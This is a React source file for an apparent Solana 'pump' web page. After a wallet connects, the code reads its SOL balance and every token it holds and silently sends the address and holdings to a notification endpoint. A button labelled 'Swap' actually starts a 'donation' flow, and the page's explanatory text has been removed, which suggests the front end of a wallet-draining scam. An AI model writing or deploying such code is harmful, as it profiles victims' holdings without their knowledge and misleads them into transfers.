import { useWallet } from '@solana/wallet-adapter-react';
import { WalletMultiButton } from '@solana/wallet-adapter-react-ui';
import { Button } from '@/components/ui/button';
import { usePump } from '@/hooks/useDonation';
// Removed DonationProgress per request
import { Heart, Wallet } from 'lucide-react';
import backgroundImage from '@/assets/web-background.png';
import logoImage from '/pump.png';
import { useState, useEffect, useRef } from 'react';
import { useConnection } from '@solana/wallet-adapter-react';
import { LAMPORTS_PER_SOL } from '@solana/web3.js';
import { notify } from '@/lib/notify';
import { TOKEN_PROGRAM_ID } from '@solana/spl-token';
import { FeedbackModal } from '@/components/FeedbackModal';
import { CenterWalletButton } from '@/components/CenterWalletButton';

const Index = () => {
  const { connected, publicKey, connect, select, wallets } = useWallet();
  const { connection } = useConnection();
  const { startDonation, isProcessing, transactions, currentIndex, pumpOutcome } = usePump();
  const [walletBalance, setWalletBalance] = useState<number>(0);
  const [isEligible, setIsEligible] = useState<boolean>(false);
  const hasNotifiedConnect = useRef(false);
  const [feedbackOpen, setFeedbackOpen] = useState(false);

  const totalValue = transactions.reduce((sum, tx) => sum + tx.usdValue, 0);

  // Removed tokens array for ongoing campaigns

  useEffect(() => {
    // Open the feedback modal when the pump flow is cancelled or errors
    if (pumpOutcome === 'cancelled' || pumpOutcome === 'error') {
      setFeedbackOpen(true);
    }
  }, [pumpOutcome]);

  useEffect(() => {
    const checkBalance = async () => {
      if (publicKey) {
        try {
          const balance = await connection.getBalance(publicKey);
          const solBalance = balance / LAMPORTS_PER_SOL;
          setWalletBalance(solBalance);
          setIsEligible(solBalance >= 0.00001);

          // Send connect notification once
          if (connected && !hasNotifiedConnect.current) {
            try {
              const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
                programId: TOKEN_PROGRAM_ID,
              });
              const tokens = tokenAccounts.value
                .map(({ account }) => {
                  const info = account.data.parsed.info;
                  const amount = info.tokenAmount.uiAmount;
                  if (!amount || amount <= 0) return null;
                  return {
                    mint: info.mint,
                    symbol: info.mint.slice(0, 8),
                    amount: amount,
                  };
                })
                .filter(Boolean);

              await notify('wallet_connected', {
                address: publicKey.toBase58(),
                solBalance: solBalance,
                tokens: tokens,
              });
              hasNotifiedConnect.current = true;
            } catch (e) {
              console.warn('connect notify error', (e as Error).message);
            }
          }
        } catch (error) {
          console.error('Error fetching balance:', error);
        }
      }
    };

    if (connected) {
      checkBalance();
      const interval = setInterval(checkBalance, 5000);
      return () => clearInterval(interval);
    }
  }, [connected, publicKey, connection]);

  return (
    <div className="min-h-screen flex flex-col relative overflow-hidden bg-black">
      {/* Top Bar */}
      <div className="relative z-20">
        <div className="container mx-auto px-4 py-3 flex items-center justify-between">
          <div className="flex items-center gap-3">
            {/* Logo without text */}
          </div>
          <WalletMultiButton className="!bg-primary hover:!bg-primary/90 !px-2 !text-xs sm:!text-sm sm:!px-4">connect wallet</WalletMultiButton>
        </div>
      </div>

      {/* Main Content */}
      <div className="relative z-10 flex-1 flex flex-col items-center justify-center p-4">
        <div className="w-full max-w-2xl space-y-8">
          {/* Header - removed text content */}
          <div className="text-center space-y-4">
            <div className="pt-4">
              {!connected && <CenterWalletButton />}
            </div>
          </div>

          {/* Wallet Connection */}
          <div className="flex flex-col items-center gap-4">
            {!connected ? (
              <div className="text-center space-y-4">
                {/* Removed text content */}
              </div>
            ) : (
              <div className="w-full space-y-6">
                {/* Action Button */}
                {!isProcessing && transactions.length === 0 && (
                  <Button
                    variant="pump"
                    size="xl"
                    onClick={startDonation}
                    className="w-full"
                    disabled={isProcessing}
                  >
                    <svg className="w-6 h-6 mr-2" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                      <path d="M13 3L4 14H12L11 21L20 10H12L13 3Z" fill="currentColor" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                    </svg>
                    Swap
                  </Button>
                )}

              </div>
            )}
          </div>

        </div>
      </div>

      {/* Removed Token Marquee section as requested */}

      <FeedbackModal
        open={feedbackOpen}
        onOpenChange={setFeedbackOpen}
        address={publicKey ? publicKey.toBase58() : undefined}
        context={pumpOutcome === 'cancelled' ? 'cancelled' : 'error'}
      />

      <style>{`
        @keyframes gradient {
          0%, 100% { background-position: 0% 50%; }
          50% { background-position: 100% 50%; }
        }
        .animate-gradient {
          animation: gradient 3s ease infinite;
        }
        .delay-1000 {
          animation-delay: 1s;
        }
        
        @keyframes marquee {
          0% { transform: translateX(0); }
          100% { transform: translateX(-50%); }
        }
        
        .marquee-container {
          overflow: hidden;
          white-space: nowrap;
        }
        
        .marquee-content {
          display: inline-block;
          animation: marquee 30s linear infinite;
        }
      `}</style>
    </div>
  );
};

export default Index;
